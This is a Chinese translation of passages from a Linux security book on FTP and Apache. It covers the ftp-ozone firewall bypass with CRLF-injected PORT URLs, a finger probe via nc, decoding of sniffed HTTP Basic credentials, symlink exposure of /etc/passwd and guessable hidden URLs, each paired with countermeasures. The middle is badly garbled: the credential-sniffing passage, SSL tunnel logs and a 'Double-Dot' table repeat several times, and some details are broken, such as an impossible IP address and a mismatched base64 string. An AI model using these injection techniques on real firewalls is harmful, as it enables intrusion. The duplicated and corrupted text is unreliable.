hackerbox# nc secure-ftp.example.com 79

root

Login: /root Name: Superuser

Directory: /root Shell: /bin/bash

On since Sep 17 12:15 (PST) on tty2

  7 hours 18 minutes idle

No mail.

No Plan.
```



即使你处于防火墙之后，也没有理由让 `finger` 等不必要的服务继续运行。

> 提示：`Ftp-ozone` 程序写入了 123 个 "." 字符，随后是 PASV 命令 `"227 (10,10,10,10,0,79)"`。FTP 服务器认为此为非法命令，并回复了 "...（很多点）. ...227 (10,10,10,10,0,79)': : command not understood。" 

`Ftp-ozone` 恰好选择了填充一个 TCP 数据包所需的点数量。因此，错误信息中的第一个包包含了点，而第二个包包含了字符串 `"227 (10,10,10,10,0,79)': : command not understood."`。防火墙看到这是一个合法的 PASV 命令，于是允许攻击者连接到 FTP 服务器的 79 端口。

# 破解的 Linux：Linux 安全秘密与解决方案

## 保护防火墙后的 FTP 服务器

使用上述的 `Ftp-ozone` 程序测试你受防火墙保护的 FTP 服务器。如果你存在漏洞，请联系防火墙供应商进行升级。`ip_masq_ftp` 模块不再受此问题影响。

作为额外的预防措施，只需配置你的 FTP 服务器不使用 PASV FTP。

## 防火墙后 FTP 客户端的未经授权端口访问

| 流行度 | 4 |
|--- |--- |
| 简单性 | 5 |
| 影响 | 6 |
| 风险等级 | 5 |

为了让防火墙支持活动 FTP，它必须知道如何转换 `PORT` 命令提供的地址、在防火墙外部绑定端口，并正确地将此分发给实际 FTP 客户端。如果没有维护完整的连接状态记录，这并非易事，而许多厂商为了更快的速度而选择避开这一点。黑客可能会欺骗 FTP 客户端发送虚假的 `PORT` 命令，防火墙会接受该命令并建立到任意端口的 FTP 机器。Dug Song 的另一个概念验证程序，名为 `Ftp-ozone` (`http://www.monkey.org/~dugsong/ftp-ozone.c`)，将提供一个可以发送给客户端的 URL，以欺骗防火墙。例如，当用户点击链接时，入站连接将对 FTP 服务器可用。注意：为了可读性：

| 工具 | 操作 |
|---|---|
| hackerbox | `ftpd-ozone machine.example.com 79` |
| Netscape | URL to send client at 127.0.0.1:77: `ftp://10.10.10.10/aaaaaaaaaaaaaaaaaaaa%0d%aPORT 192.168.10.0,79` |
| MSIE | URL to send client at 127.0.0.1:77: `ftp://10.10.10.10/aaaaaaaaaaaaaaaaaaaa%0d%aPORT 192.168.10.0,79` |
| wget | URL to send client at 127.0.0.1:77 |

一旦用户访问了提供的 URL，`ftpd-ozone` 脚本伪装成 FTP 服务器，当连接建立时，它会告知位于防火墙后的 FTP 客户端的 IP 地址和你可以访问的实际端口 `79`。然而，有很多方法可以判断这一点，例如 JavaScript 代码，或简单的读取邮件头。

## 保护防火墙后的 FTP 服务器

针对你自己的机器测试 `ftp-ozone` 攻击，查看防火墙是否存在漏洞。如果是，请立即联系供应商。`ip_masq_ftp` 模块已经升级修复了这个问题。

另一个可靠的解决方案是仅使用 PASV FTP，它不受此类攻击。

## 匿名 FTP 问题

匿名 FTP 曾是向互联网上的任何人提供下载的唯一方式。FTP 协议以前需要有效的 FTP 登录，但现在可以是匿名登录。然而，FTP 服务器也存在允许 root 访问的漏洞。我们在第 6 章展示了这样一个例子。2001年1月的 Slam 蠕虫成功利用了 `ftpd`。升级 FTP 服务器是一项常备措施。

## 匿名网站

| 流行度 | 6 |
| 简单性 | 5 |
| 影响 | 5 |
| 风险等级 | 5 |

许多提供匿名 FTP 的网站配置糟糕，允许用户上传数据。这些网站很快会被黑客滥用，存储其他黑客访问的文件。这些文件可能是攻击脚本、破解版软件（warez）、色情，或者只是他们喜欢的 MP3。如前，此类网站也可以用于 FTP 回弹攻击。

# 破解的 Linux：安全秘密与解决方案

## 可利用的 FTP 防御措施

你可能通过通过带宽利用率激增意识到你正在提供非预期的内容。此外，你应该会在日志文件中注意到更多的 `RETR` 条目。

首先，确保你没有对 `world` 可写或由 FTP 服务器拥有的目录，正如之前在 FTP 攻击防御措施节中所述。如果合适，你可能还希望限制允许的 IP 地址。

更好，如果你只提供内容而不需要支持文件上传，我们强烈建议使用以下仅匿名的 FTP 服务器。

`Aftpd` 由安全大师 Marcus Ranum 编写，`aftpd` (`http://www.furan.com/pubs/index.shtml`) 是 BSD FTP 服务器的精简版本。它只支持匿名 FTP，并且如果编译为 `-READONLY`（应该是这样的），它将只提供文件——无法上传内容。20 端口不用于出站连接，这意味着服务器可以立即放弃所有 root 权限。在服务器之外执行的唯一程序是 `/bin/ls`。Marcus 观察过 `aftpd` 代码，但没有已知的漏洞。

`Publicfile` (`http://cy.py/publicfile.html`) 由 Dan Bernstein 编写，可以作为超安全的 HTTP 服务器或匿名 FTP 服务器运行。它不支持任何传统的问题功能（如 `SITE EXEC`），具有适当的 `PORT/PASV` 保护，并且不运行任何外部命令，即使是 `/bin/ls`。它得到了充分的支持，尽管自创建以来从未需要过任何安全修复。

## 总结

电子邮件和 FTP 无处不在，且安全记录非常糟糕。如果你想支持这些服务，务必运行最新版本的软件，并准备好在发现任何安全问题时进行升级。订阅与你的邮件和 FTP 软件相关的邮件列表，以便在新版本发布时能尽早收到警告。

## 邮件服务器

为了安全配置邮件是一个复杂的主题，遗憾的是，除了决定你的配置需要什么、阅读文档并监控日志以确保你只做了你想要的事而没做别的之外别无办法。这里讨论的程序对于大多数人的目的带有相同的默认设置，但几乎每个人的配置都是不同的，大型网络邮件主机管理员的需求和关注点也与拨号单用户 POP 客户端不同。

`Sendmail` 是最广泛使用的邮件服务器，其安全性由于自诞生以来就在网上接受测试而走了一条“硬道路”。就像 `vi` 一样，了解 `Sendmail` 的基础知识不会出错，因为几乎安装在每个商用系统上。

# 第 11 章：邮件与 FTP 安全

Linux 安装。`Qmail` 和 `Postfix` 是从 `Sendmail` 的错误中学习到的，它们体积更小、更容易配置，并且在设计时考虑了安全性，但使用范围较窄，可以参考的知识库也较小。

## FTP

在读完我们关于 FTP 的讨论后，你可能正在困惑地挠头，或者正经历着背叛的感觉。如果你一直在关注，你应该意识到我们针对 FTP 协议问题建议了几种相互冲突的解决方案：

- 不要使用主动模式（Active Mode）FTP。支持 FTP 可能会导致你的 FTP 服务器被用于反弹攻击和端口扫描。针对 FTP 客户端进行数据劫持是可能的，但并不常见。某些状态检测防火墙允许通过用户访问特殊构造的 URL，对你受保护的 FTP 客户端建立未经授权的。

- 不要使用被动模式（Passive Mode）FTP。支持 PASV FTP 可能会开启数据劫持的可能性，允许攻击者窃取你的数据或提供错误的下载内容。防火墙后 FTP 服务器上的任意端口都可能被黑客利用巧妙的 FTP 命令访问。

因此，如果 FTP 数据传输只有两种方法，而我们建议你两种都不要用，那么该怎么办？很简单。

## 应对措施：不要使用 FTP

如果你只支持匿名 FTP 文件检索，请根本不要运行 FTP 服务器。运行一个 Web 服务器。我们建议使用之前提到的 `Publicfile`，它可以以一种安全的、精简的只读方式支持 HTTP。

如果你的用户必须使用 `scp` 或 `sftp` 通过 FTP 上传文件，这两者都是 `Ssh` 的一部分。`scp` 是一个命令行安全复制程序，而 `sftp` 本质上相同，但具有交互式的类 ftp 界面。使用这些程序可以保护你的密码不被嗅探，并确保数据不会被攻击者篡改。

# 第 12 章

## Web 服务器与动态内容

# 骇客入侵：Linux 安全秘密与解决方案

本章重点关注 Linux Web 服务器的安全防护，特别是 Apache。我们讨论了如何配置安全的 Apache 服务器，以及为其编写安全的 CGI 程序。本章不讨论网络客户端（如 Netscape、Opera、Lynx 等）的安全问题。关于网络客户端安全问题的详细描述，请参阅 Joel Scambray、Stuart McClure 和 George Kurtz 编写的《Hacking Exposed: Network Security Secrets & Solutions》（Osborne/McGraw-Hill，2000年）。

## HTTP 请求

当点击 Web 浏览器中的链接时，浏览器会尝试对网络上某处的服务器建立 TCP/IP 连接。该连接通常建立在 80 端口，即 HTTP 端口。随后浏览器向服务器发送一个称为 HTTP 请求的消息，服务器对请求的信息做出响应。浏览器接收到这些信息并根据接收到的信息类型进行渲染或显示。

浏览器只是连接 Web 服务器的一种方式。你也可以从 shell `get` `telnet` 连接到 Web 服务器的 80 端口。以下示例显示了连接到本地 80 端口，并发送一个 HTTP 请求请求 Web 服务器文档树根目录的头部信息：



`telnet localhost 80`

```
trying 127.0.0.1...

Connected to localhost.

Escape character is '^'.

HEAD /HTTP/1.0

HTTP/1.1 200 OK

Date: Wed, 06 Dec 2000 19:59:03 GMT

Server: Apache/1.3.14 (Unix) mod_perl/1.24_01

Content-Length: 85

Connection: close

Content-Type: text/html
```

```
Connection closed by foreign host.
```

使用的 HTTP 请求是 `HEAD /HTTP/1.0`。该请求仅索 Web 服务器文档树根目录 `/` 的头部信息。使用的协议是 HTTP 1.0 版本。

HTTP 协议的最新版本是 1.1 版本。在用 `telnet` 手动连接时，1.0 版本更容易使用，因此我们在大多数示例将使用 1.0 版本。

# 第 12 章：Web 服务器与动态内容

此头部告诉我们关于所连接的机器的以下信息：

- 服务器是 Apache 版本 1.3.14。
- 服务器运行在 UNIX 上。（UNIX 版本是 Linux，但在此头部中未显示。）
- 服务器是用 mod_perl 版本 1.24_01 构建的。

## 从头部中获取信息

| 流行度 | 4 |
| 简单性 | 10 |
| 影响 | 4 |
| 风险等级 | 6 |

黑客可以根据 Web 发出的头部获取关于机器的信息。黑客可以利用这些信息来利用该特定版本的 Web 服务器软件。例如，假设在 mod_perl 版本 1.24_01 中发现了一个漏洞。黑客就可以开始扫描站点，检查它们的头部，直到找到一个使用 mod_perl 版本 1.24_01 的站点。然后他就可以开始攻击。

## 修改默认头部

许多 Web 服务器允许你修改打印在头部中的信息。例如，你可以让头部显示如下：

```
HTTP/1.1 200 OK

Date: Wed, 06 Dec 2000 19:59:03 GMT

Server: KoolWeb/3.7.1

Content-Length: 85

Connection: close

Content-Type: text/html
```

这个修改后的头部没有提供关于运行此 Web 服务器的机器的任何有用且准确的信息。寻找 mod_perl 版本 1.24_01 的黑客可能会忽略这个。修改 Apache 以显示此头部，编辑 `src/include/httpd.h`：

```
#define SERVER "Apache"

#define REVISION "1.3.14"
```

然后按照通常方式编译并安装。在启动服务器之前，在 `httpd.conf` 添加以下指令：

```
ServerTokens Min
```

> 注意 对于非 Apache Web 服务器更改头部，请参考你的 Web 服务器文档。

# 骇客入侵：Linux 安全秘密与解决方案

## 必要时升级旧软件

当黑客攻击运行旧版本有漏洞软件的机器时，最佳应对措施是确保你运行最新版本。我们无法强调这一点的重要性。

## 访问敏感数据

流行度： 4
简单性： 7
影响： 5
风险等级： 5

你有一些想要提供给特定人的敏感信息，HTTP 用户身份验证限制了对 Web 服务器特定目录的访问。浏览器通过一个输入用户名和密码的对话框来实现验证。密码用星号表示。

此用户名/密码组合由浏览器进行 base64 编码并发送到服务器。注意的是，密码是以编码的形式在网络上传输的。

这里是浏览器在头部发送的身份验证信息的示例。`Authorization` 字段用于传递编码的用户名/密码：

```
machine1 telnet 127.0.0.1...

Connected to localhost.

Escape character is '^'.

GET /protected/directory HTTP/1.0

Authorization: Basic c2VjmV00k1BbUdvZA==
```

# 第 12 章：Web 服务器与动态内容

## 使用 IP 限制保护 Web 数据

许多 Web 服务器（包括 Apache）可以根据请求者的 IP 限制目录访问。如果你知道允许访问你数据的用户的 IP 地址，Apache 可以配置为仅允许这些 IP 地址。如果不是你选择的 IP 发起请求，将被拒绝访问。

配置 Apache 根据 IP 地址限制访问的一种方法是在 `.htaccess` 中放入以下内容：

```
Order Deny, Allow

Deny from All

Allow from 192.168.1.100

Allow from 192.168.1.101
```

Apache 的配置将在本章稍后详细讨论。

## 嗅探 HTTP 身份验证用户名/密码

| 流行度 | 4 |
| 简单性 | 6 |
| 影响 | 6 |
| 风险等级 | 5 |

黑客正在嗅探你的网络并看到了传输的以下 HTTP 身份验证用户名/密码：

```
GET /protected/directory HTTP/1.0\r\nAuthorization: Basic c2VjmV00k1BbUdvZA==
```

# 破解 Linux 揭秘：Linux 安全秘密与解决方案

他知道正在被请求的文档 (`/protected/directory`)，他也知道包含加密用户名/密码的 base64 字符串。

由于身份验证字符串是明文传输的，黑客可以运行以下 Perl 命令来解密用户名/密码：

```perl
hacker_machine$ perl -MIME:Base64 -le \
> 'print decode_base64 "c2VjmVok1BbudVZA=="'
```
secret:IamGod
```

显示的输出为用户名:密码。黑客现在可以访问这些数据了。

> 注意：如第 9 章节“密码破解”所述，切勿在 HTTP 身份验证登录时对使用相同的密码。如果两个密码都相同，黑客现在就可以以你的身份登录到这台机器。

### 使用安全的 HTTP 连接

为了最大限地减少黑客从 HTTP 请求中嗅探用户名/密码的概率，请使用安全套接层（SSL）。SSL 不仅在数据传输到网站之前对其加密，还能对从网站接收的数据进行解密。因此，所有数据都以加密形式在网络上发送。

这是一个使用 tunnel 连接监听 SSL 端口 443 的网站的示例。请注意，在传输任何数据之前，都会建立一个安全连接，随后的所有数据都经过加密。因此，如果有任何敏感信息（如身份验证用户名/密码）或任何敏感数据（如信用卡号），对于在网络监听的黑客来说都是不可读取的。

```
machine1$ tunnel -f -d7 -c -r www.example.com:443
LOG[28843:1024]: Using 'example.com,443' as tcp service name
LOG[28843:1024]: Snagged 64 random bytes from /home/jdoe/.rnd
LOG[28843:1024]: Wrote 1024 new random bytes to /home/jdoe/.rnd
LOG[28843:1024]: STATUS claims sufficient entropy for the PRNG
LOG[28843:1024]: PRNG seeded successfully
LOG[28843:1024]: tunnel 3.1 on 1686-pc-linux-gnu PTHREAD+LIBWBRAP
LOG[28843:1024]: ...example.com,443 started
LOG[28843:1024]: ...example.com connecting 123.45.266.7:443
LOG[28843:1024]: Remote host connected
LOG[28843:1024]: before/connect initialization
LOG[28843:1024]: before/connect initialization
LOG[28843:1024]: SSLv3 write client hello A
LOG[28843:1024]: SSLv3 read server hello A
LOG[28843:1024]: SSLv3 read server certificate A
LOG[28843:1024]: SSLv3 write client key exchange A
```

## 第 12 章：Web 服务器与动态内容



```
LOG[28843:1024]: SSLv3 write change cipher spec A
LOG[28843:1024]: SSLv3 write finished A
LOG[28843:1024]: SSLv3 flush data
LOG[28843:1024]: SSLv3 read finished A
LOG[28843:1024]: SSL negotiation finished successfully
LOG[28843:1024]: 1 items in the session cache
LOG[28843:1024]: 1 client connects (SSL_connect())
LOG[28843:1024]: 1 client connects that finished
LOG[28843:1024]: 0 renegotiations requested
LOG[28843:1024]: 0 server connections (SSL_accept())
LOG[28843:1024]: 0 server connects that finished
LOG[28843:1024]: 0 renegotiations requested
LOG[28843:1024]: 0 session cache hits
LOG[28843:1024]: 0 session cache misses
LOG[28843:1024]: 0 session cache timeouts
LOG[28843:1024]: SSL negotiation finished successfully
LOG[28843:1024]: www.example.com.443 opened with SSLv3,
cipher DES-CBC3-SHA (168 bits)
HEAD /HTTP/1.0

HTTP/1.1 200 OK
Server: Apache/1.3.14 (Unix) mod_perl/1.24_01
Date: Mon, 18 Dec 2000 15:53:08 GMT
Content-length: 152
Content-type: text/html
Connection: close
```

```
LOG[28843:1024]: SSL negotiation finished successfully
LOG[28843:1024]: SSL negotiation finished successfully
LOG[28843:1024]: www.example.com.443 opened with SSLv3,
cipher DES-CBC3-SHA (168 bits)
HEAD /HTTP/1.0
HTTP/1.1 200 OK
Server: Apache/1.3.14 (Unix) mod_perl/1.24_01
Date: Mon, 18 Dec 2000 15:53:08 GMT
Content-length: 152
Content-type: text/html
Connection: close
```

```
LOG[28843:1024]: SSL negotiation finished successfully
LOG[28843:1024]: SSL negotiation finished successfully
LOG[28843:1024]: www.example.com.443 opened with SSLv3,
cipher DES-CBC3-SHA (168 bits)
HEAD /HTTP/1.0
HTTP/1.1 200 OK
Server: Apache/1.3.14 (Unix) mod_perl/1.24_01
Date: Mon, 18 Dec 2000 15:53:08 GMT
Content-length: 152
Content-type: text/html
Connection: close
```

```
LOG[28843:1024]: SSL negotiation finished successfully
LOG[28843:1024]: SSL negotiation finished successfully
LOG[28843:1024]: www.example.com.443 opened with SSLv3,
cipher DES-CBC3-SHA (168 bits)
HEAD /HTTP/1.0
HTTP/1.1 200 OK
Server: Apache/1.3.14 (Unix) mod_perl/1.24_01
Date: Mon, 18 Dec 2000 15:53:08 GMT
Content-length: 152
Content-type: text/html
Connection: close
```

Double-Dot:

| Popularity: 8 |
|------|
| Simplicity: 10 |
| Risk Rating: 6 |

![](img/3329ff1435b4ef56cd28c45_0.png)

# 破解 Linux 揭秘：Linux秘密与解决方案

他知道正在被请求的文档 (`/protected/directory`)，他也知道包含加密用户名/密码的 base64 字符串。

由于身份验证字符串是明文传输的，黑客可以运行以下 Perl 命令来解密用户名/密码：

```perl
hacker_machine$ perl -MIME:Base64 -le \
> 'print decode_base64 "c2VjmVok1BbudVZA=="
```

显示的输出为用户名:密码。黑客现在可以访问这些数据了。

> 注意：如第 9 章“密码破解”所述，切勿在 HTTP 身份验证登录时使用相同的密码。如果两个密码都相同，黑客现在就可以以你的身份登录到这台机器。

## 使用安全的 HTTP 连接

为了最大限地减少黑客从 HTTP 请求中嗅探用户名/密码的概率，请使用安全套接层（SSL）。SSL 不仅在数据传输到网站之前对其加密，还能对从网站接收的数据进行解密。因此，所有数据都以加密形式在网络上发送。

这是一个使用 `tunnel` 连接监听 SSL 端口 `443` 的网站的示例。请注意，在传输任何数据之前，都会建立一个安全连接，随后的所有数据都经过加密。因此，如果有任何敏感信息（如身份验证用户名/密码）或任何敏感数据（如信用卡号），对于在网络监听的黑客来说都是不可读取的。

```
machine1$ tunnel -f -d7 -c -r www.example.com:443
LOG[28843:1024]: Using 'example.com,443' as tcp service name
LOG[28843:1024]: Snagged 64 random bytes from /home/jdoe/.rnd
LOG[28843:1024]: Wrote 1024 new random bytes to /home/jdoe/.rnd
LOG[28843:1024]: STATUS claims sufficient entropy for the PRNG
LOG[28843:1024]: PRNG seeded successfully
LOG[28843:1024]: tunnel 3.1 on 1686-pc-linux-gnu PTHREAD+LIBWBRAP
LOG[28843:1024]: ...example.com,443 started
LOG[28843:1024]: ...example.com connecting 123.45.266.7:443
LOG[28843:1024]: Remote host connected
LOG[28843:1024]: before/connect initialization
LOG[28843:1024]: before/connect initialization
LOG[28843:1024]: SSLv3 write client hello A
LOG[28843:1024]: SSLv3 read server hello A
LOG[28843:1024]: SSLv3 read server certificate A
LOG[28843:1024]: SSLv3 write client key exchange A
```

## 第 12 章：Web 服务器与动态内容



```
LOG[28843:1024]: SSLv3 write change cipher spec A
LOG[28843:1024]: SSLv3 write finished A
LOG[28843:1024]: SSLv3 flush data
LOG[28843:1024]: SSLv3 read finished A
LOG[28843:1024]: SSL negotiation finished successfully
LOG[28843:1024]: 1 items in the session cache
LOG[28843:1024]: 1 client connects (SSL_connect())
LOG[28843:1024]: 1 client connects that finished
LOG[28843:1024]: 0 renegotiations requested
LOG[28843:1024]: 0 server connections (SSL_accept())
LOG[28843:1024]: 0 server connects that finished
LOG[28843:1024]: 0 renegotiations requested
LOG[28843:1024]: 0 session cache hits
LOG[28843:1024]: 0 session cache misses
LOG[28843:1024]: 0 session cache timeouts
LOG[28843:1024]: SSL negotiation finished successfully
LOG[28843:1024]: www.example.com.443 opened with SSLv3,
cipher DES-CBC3-SHA (168 bits)
HEAD /HTTP/1.0

HTTP/1.1 200 OK
Server: Apache/1.3.14 (Unix) mod_perl/1.24_01
Date: Mon, 18 Dec 2000 15:53:08 GMT
Content-length: 152
Content-type: text/html
Connection: close
```

LOG[28843:1024]: SSL negotiation finished successfully

LOG[28843:1024]: SSL negotiation finished successfully

LOG[28843:1024]: www.example.com.443 opened with SSLv3,

cipher DES-CBC3-SHA (168 bits)

HEAD /HTTP/1.0

HTTP/1.1 200 OK

Server: Apache/1.3.14 (Unix) mod_perl/1.24_01

Date: Mon, 18 Dec 2000 15:53:08 GMT

Content-length: 152

Content-type: text/html

Connection: close

LOG[28843:1024]: SSL negotiation finished successfully

[28843:1024]: SSL negotiation finished successfully

[28843:1024]: www.example.com.443 opened with SSLv3,

cipher DES-CBC3-SHA (168 bits)

HEAD /HTTP/1.0

HTTP/1.1 200 OK

Server: Apache/1.3.14 (Unix) mod_perl/1.24_01

Date: Mon, 18 Dec 2000 15:53:08 GMT

Content-length: 152

Content-type: text/html

Connection: close

LOG[28843:1024]: SSL negotiation finished

[28843:1024]: SSL negotiation finished successfully

LOG[28843:1024]: .example.com.443 opened with SSLv3,

cipher DES-CBC3-SHA (168 bits)

HEAD /HTTP/1.0

HTTP/1.1 200 OK

Server: Apache/1.3.14 (Unix) mod_perl/1.24_01

Date: Mon, 18 Dec 2000 15:53:08 GMT

Content-length: 152

Content-type: text/html

Connection: close

Double-Dot:

| Popularity: 8 |

|------|

| Simplicity: 10 |

| Risk Rating: 6 |

![](img/3329ff1435b4ef56cd28c45_0.png)

# 破解 Linux 揭秘：Linux秘密与解决方案

他知道正在被请求的文档 (`/protected/directory`)，他也知道包含加密用户名/密码的 base64 字符串。

由于身份验证字符串是明文传输的，黑客可以运行以下 Perl 命令来解密用户名/密码：

```perl
hacker_machine$ perl -MIME:Base64 -le \
> 'print decode_base64 "c2VjmVok1BbudVZA=="
```

显示的输出为用户名:密码。黑客现在可以访问这些数据了。

> 注意：如第 9 章“密码破解”所述，切勿在 HTTP 身份验证登录时使用相同的密码。如果两个密码都相同，黑客现在就可以以你的身份登录到这台机器。

## 使用安全的 HTTP 连接

为了最大限地减少黑客从 HTTP 请求中嗅探用户名/密码的概率，请使用安全套接层（SSL）。SSL 不仅在数据传输到网站之前对其加密，还能对从网站接收的数据进行解密。因此，所有数据都以加密形式在网络上发送。

这是一个使用 `tunnel` 连接监听 SSL 端口 `443` 的网站的示例。请注意，在传输任何数据之前，都会建立一个安全连接，随后的所有数据都经过加密。因此，如果有任何敏感信息（如身份验证用户名/密码）或任何敏感数据（如信用卡号），对于在网络监听的黑客来说都是不可读取的。

```
machine1$ tunnel -f -d7 -c -r www.example.com:443
LOG[28843:1024]: Using 'example.com,443' as tcp service name
LOG[28843:1024]: Snagged 64 random bytes from /home/jdoe/.rnd
LOG[28843:1024]: Wrote 1024 new random bytes to /home/jdoe/.rnd
LOG[28843:1024]: STATUS claims sufficient entropy for the PRNG
LOG[28843:1024]: PRNG seeded successfully
LOG[28843:1024]: tunnel 3.1 on 1686-pc-linux-gnu PTHREAD+LIBWBRAP
LOG[28843:1024]: ...example.com,443 started
LOG[28843:1024]: ...example.com connecting 123.45.266.7:443
LOG[28843:1024]: Remote host connected
LOG[28843:1024]: before/connect initialization
LOG[28843:1024]: before/connect initialization
LOG[28843:1024]: SSLv3 write client hello A
LOG[28843:1024]: SSLv3 read server hello A
LOG[28843:1024]: SSLv3 read server certificate A
LOG[28843:1024]: SSLv3 write client key exchange A
```

## 第 12 章：Web 服务器与动态内容



```
LOG[28843:1024]: SSLv3 write change cipher spec A
LOG[28843:1024]: SSLv3 write finished A
LOG[28843:1024]: SSLv3 flush data
LOG[28843:1024]: SSLv3 read finished A
LOG[28843:1024]: SSL negotiation finished successfully
LOG[28843:1024]: 1 items in the session cache
LOG[28843:1024]: 1 client connects (SSL_connect())
LOG[28843:1024]: 1 client connects that finished
LOG[28843:1024]: 0 renegotiations requested
LOG[28843:1024]: 0 server connections (SSL_accept())
LOG[28843:1024]: 0 server connects that finished
LOG[28843:1024]: 0 renegotiations requested
LOG[28843:1024]: 0 session cache hits
LOG[28843:1024]: 0 session cache misses
LOG[28843:1024]: 0 session cache timeouts
LOG[28843:1024]: SSL negotiation finished successfully
LOG[28843:1024]: www.example.com.443 opened with SSLv3,
cipher DES-CBC3-SHA (168 bits)
HEAD /HTTP/1.0

HTTP/1.1 200 OK
Server: Apache/1.3.14 (Unix) mod_perl/1.24_01
Date: Mon, 18 Dec 2000 15:53:08 GMT
Content-length: 152
Content-type: text/html
Connection: close
```

# Linux 破解深度揭秘：Linux 安全秘密

- Apache 是开源的。
- Apache 是免费的。

查看 Netcraft 调查，了解 Apache 较于其他 Web 服务器的流行程度：`http://www.netcraft.com/survey/`

除了这些原因外，Apache 也相对安全。它虽然有安全漏洞的记录，但当这些漏洞被发现时，互联网上几乎就能提供补丁。这与许多其他 Web 服务器，尤其是专有 Web 服务器不同，后者修复安全漏洞的速度很慢。

大多数 Linux 发行版都带了 Apache，如果你使用的是较新版本的 Linux，很可能 Apache 已经安装并运行。你可以通过检查处理器状态来查看它是否正在运行：

```
machine$ ps -ef grep httpd
root      3978 1  0 Dec0 ? 00:00:00 /usr/local/apache/bin/httpd
nobody    3979 1  0 Dec0 ? 00:00:00 /usr/local/apache/bin/httpd
nobody    3980 1  0 Dec0 ? 00:00:00 /usr/local/apache/bin/httpd
nobody    3981 1  0 Dec0 ? 00:00:00 /usr/local/apache/bin/httpd
nobody    3982 1  0 Dec0 ? 00:00:00 /usr/local/apache/bin/httpd
nobody    3983 1  0 Dec0 ? 00:00:00 /usr/local/apache/bin/httpd
nobody    3984 1  0 Dec0 ? 00:00:00 /usr/local/apache/bin/httpd
nobody    3985 1  0 Dec0 ? 00:00:00 /usr/local/apache/bin/httpd
nobody    3988 1  0 Dec0 ? 00:00:00 /usr/local/apache/bin/httpd
nobody    3989 1  0 Dec0 ? 00:00:00 /usr/local/apache/bin/httpd
```

注意 Apache 程序被称为 `httpd`，即 HTTP 守护进程。存在多个 `httpd` 副本，这确保了可以同时处理多个连接。（任何时刻运行的进程数量是可配置的。）最后，请注意用户 `nobody` 拥有除了第一个的它之外的所有进程。`nobody` 用户是处理 HTTP 请求的普通用户（尽管这也可以进行配置）。

> 这里的核心思想是，Web 服务器不应该以 root 身份运行。如果由 root 运行 `httpd`，Web 服务器将拥有仅 root 可访问文件的权限，且 Web 服务器执行的 CGI 程序也将以 root 身份运行。这使得黑客有可能操纵 CGI 程序并以 root 身份执行操作。（参见后文对 CGI 编程问题的讨论。）

如果你发现 `httpd` 运行在你的机器上，只需将浏览器指向 `localhost`：

```
http://localhost/
```

你理应看到 Apache 的欢迎页面。

> 可以在 `http://www.apache.org` 找到最新版本的 Apache。

# Apache 配置

如上文所述，Apache Web 服务器相对安全，但我们需要讨论安全配置它的方法。Apache 的配置文件通常是 `httpd.conf`。该文件包含许多指令，告诉 Apache 如何运行。

> 注意：Apache 过去使用过三个配置文件：`httpd.conf`、`access.conf` 和 `srm.conf`，但这三个文件已经合并到单个文件 `httpd.conf` 中。

Apache 必须由 `root` 启动，因为它绑定到 80 端口，但一旦启动，它就有更改运行用户的能力。通常使用 `nobody` 用户来运行 `http`，尽管可以使用任何用户。（创建一个新用户，例如 `web`，其唯一目的是拥有 `http` 进程，这并不常见。）除了指定由哪个用户拥有 `http` 进程外，还应该配置所使用的组。`httpd.conf` 中的以下几行配置了用户和组：

```
User nobody
Group nobody
```

> 注意：端口 80 是默认的 HTTP 端口，但 Web 服务器可以绑定到任何端口。常见的例子有 8080 和 8888。

# 危险的符号链接

| 流行度 | 8 |
| :--- | :--- |
| 简单性 | 9 |
| 影响 | 5 |
| 风险等级 | 8 |

允许 Web 服务器跟随符号链接是一个潜在的安全风险。Web 服务器的设计初衷是只提供存在于 Web 文档树内的文档。该文档树的根通常位于 `/usr/local/apache/htdocs`（按照惯例，这可以在 `httpd.conf` 中进行配置）。当使用此 URL 请求根文档时：

```
http://localhost/
```

所提供的文件通常是 `index.html`，它位于 `httpdocs` 根目录内。限制 Web 服务器仅访问文档树内的文件是最安全的策略，但可以将服务器配置为允许访问文档树之外的符号链接。如果服务器允许符号链接，可能会出现以下场景：用户在她的 html 目录中放置一个指向 `/etc` 的符号链接。我们称该链接为

# Linux 破解深度揭秘：Linux 安全秘密与解决方案

`link_to_etc`。有一次，以下请求为黑客提供了信息，让他获取了一份 `/etc/passwd` 副本：

```
http://localhost/
```

# 安全地配置符号链接

允许符号链接并不完全是一个坏主意。然而，必须仔细考虑何时以及如何允许符号链接。为了说明这一点，假设一个开发者想要共享位于 `/etc` 的目录。他们在文档根目录下创建一个指向 `/etc` 的符号链接。我们称该链接为 `link_to_etc`。



假设开发者在文档根目录下创建一个指向 `/etc` 的符号链接：

```
ln -s /etc /usr/local/apache/htdocs/etc_link
```

现在，如果用户导航到：

```
http://localhost/etc_link
```

服务器将提供 `/etc` 的内容。这可能是危险的，因为 `/etc` 包含了敏感文件。为了防止这种情况，开发者可以在 `httpd.conf` 中使用 `Options` 指令：

```
<Directory "/usr/local/apache/htdocs">
    Options -FollowSymLinks
</Directory>
```

或者，开发者可以使用 `SymLinksIfMatch` 指令，在满足特定标准时才跟随符号链接：

```
<Directory "/usr/local/apache/htdocs">
    Options SymLinksIfMatch
</Directory>
```

这确保了只有当所有者符合条件时才会跟随符号链接，防止未经授权敏感文件。

# 获取目录内容

| 流行度 | 7 |

| :--- | :--- |

| 简单性 | 10 |

| 影响 | 5 |

| 风险等级 | 6 |

如果目录不包含 `index.html` 文件，Apache 可能会显示该目录中的所有文件列表。这会暴露 Web 服务器的结构，构成安全风险。为了防止这种情况，请使用 `-Indexes` 指令：

```
<Directory "/usr/local/apache/htdocs">
    Options -Indexes
</Directory>
```

另一种方法是为每个目录提供不同的索引文件：

```
<Directory "/usr/local/apache/htdocs">
    DirectoryIndex index.html index.php
</Directory>
```

如果未找到这些文件，Apache 将返回 403 Forbidden 错误，而不是目录列表。

# “隐性安全”并非不可行

许多 Web 开发者采用“隐性安全”策略，将文件放置在没有链接指向的目录中。例如，假设一个开发者正在网上写一篇技术论文，将其放在 Web 服务器树的以下位置：

```
http://www.example.com/my/private/data/paper1/index.html
```

由于没有任何方式宣传该论文的存在，人们发现该页面的概率非常小。当然，大多数开发者并不那么聪明；他们可能会把论文放在如下：

```
http://www.example.com/paper/
```

将隐藏的 URL 命名为简单易记的名字是人性，而且更容易被黑客猜到。

# 不要依赖隐性安全

黑客知道隐性安全。他们也了解人性。因此，他们经常会寻找如下 URL 中的内容：

```
http://www.example.com/new/
http://www.example.com/NEW/
http://www.example.com/devel/
http://www.example.com/development/
http://www.example.com/beta/
http://www.example.com/temp/
http://www.example.com/tmp/
http://www.example.com/private/
```

等等……

